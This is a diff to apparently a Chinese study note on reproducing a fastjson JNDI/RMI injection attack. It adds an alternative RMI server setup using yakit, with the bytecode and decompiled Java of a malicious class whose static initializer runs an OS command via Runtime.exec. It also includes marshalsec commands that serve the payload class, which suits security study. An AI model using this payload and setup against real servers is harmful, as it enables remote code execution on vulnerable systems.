@@ -8,10 +8,134 @@ python -m http.server 1111
 ```
 该目录下有恶意类。
 
-### 启动 RMI 服务
+### 启动 RMI 服务 - 选择 1
 ```bash
 /usr/lib/jvm/jdk1.8.0_65/bin/java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://localhost:1111/#TouchFile" 2222
 ```
+
+### 启动 RMI 服务 - 选择 2
+使用 `yakit` 工具，直接在指定 ip 和 port 启动 rmi 服务，并且生成一个恶意类。
+
+出于好奇，我将 16 进制字节码转换成了 byte array，发现字节码如下：
+```asm
+// class version 52.0 (52)
+// access flags 0x21
+public class hackerClass {
+
+
+  // access flags 0x1
+  public <init>()V
+    ALOAD 0
+    INVOKESPECIAL java/lang/Object.<init> ()V
+    RETURN
+    MAXSTACK = 1
+    MAXLOCALS = 1
+
+  // access flags 0x8
+  static <clinit>()V
+    TRYCATCHBLOCK L0 L1 L2 java/io/IOException
+    LDC "yakit"
+    ASTORE 0
+    GETSTATIC java/io/File.separator : Ljava/lang/String;
+    LDC "/"
+    INVOKEVIRTUAL java/lang/String.equals (Ljava/lang/Object;)Z
+    IFEQ L3
+    ICONST_3
+    ANEWARRAY java/lang/String
+    DUP
+    ICONST_0
+    LDC "/bin/sh"
+    AASTORE
+    DUP
+    ICONST_1
+    LDC "-c"
+    AASTORE
+    DUP
+    ICONST_2
+    ALOAD 0
+    AASTORE
+    ASTORE 1
+    GOTO L0
+   L3
+   FRAME APPEND [java/lang/String]
+    ICONST_3
+    ANEWARRAY java/lang/String
+    DUP
+    ICONST_0
+    LDC "cmd"
+    AASTORE
+    DUP
+    ICONST_1
+    LDC "/C"
+    AASTORE
+    DUP
+    ICONST_2
+    ALOAD 0
+    AASTORE
+    ASTORE 1
+   L0
+   FRAME APPEND [[Ljava/lang/String;]
+    INVOKESTATIC java/lang/Runtime.getRuntime ()Ljava/lang/Runtime;
+    ALOAD 1
+    INVOKEVIRTUAL java/lang/Runtime.exec ([Ljava/lang/String;)Ljava/lang/Process;
+    POP
+   L1
+    GOTO L4
+   L2
+   FRAME SAME1 java/io/IOException
+    ASTORE 2
+    ALOAD 2
+    INVOKEVIRTUAL java/io/IOException.printStackTrace ()V
+   L4
+   FRAME CHOP 2
+    RETURN
+    MAXSTACK = 4
+    MAXLOCALS = 3
+}
+
+```
+
+又转换成原生的二进制字节码格式，反编译后 java 代码如下：
+```java
+//
+// Source code recreated from a .class file by IntelliJ IDEA
+// (powered by FernFlower decompiler)
+//
+
+import java.io.File;
+import java.io.IOException;
+
+public class hackerClass {
+    public hackerClass() {
+    }
+
+    static {
+        String cmd = "yakit";
+        String[] var1;
+        if (File.separator.equals("/")) {
+            var1 = new String[]{"/bin/sh", "-c", cmd};
+        } else {
+            var1 = new String[]{"cmd", "/C", cmd};
+        }
+
+        try {
+            Runtime.getRuntime().exec(var1);
+        } catch (IOException var3) {
+            var3.printStackTrace();
+        }
+
+    }
+}
+```
+
+可以看到 `yakit` 这个工具实际上是将恶意方法写入了 `static` 代码块，在类加载的时候直接执行。
+
+我自己复现的时候，一个方案是直接写入静态代码块，一个方案是写入构造函数。
+
+之前脑子糊涂了，两三天没反应过来为什么恶意方法写在类的 `setter` 里无法被调用。
+
+因为在 `rmi` 下类加载是使用的 codebase 的动态类加载，而不是走 fastjson 的反序列化。
+
 
 ### 执行 payload
 ```bash
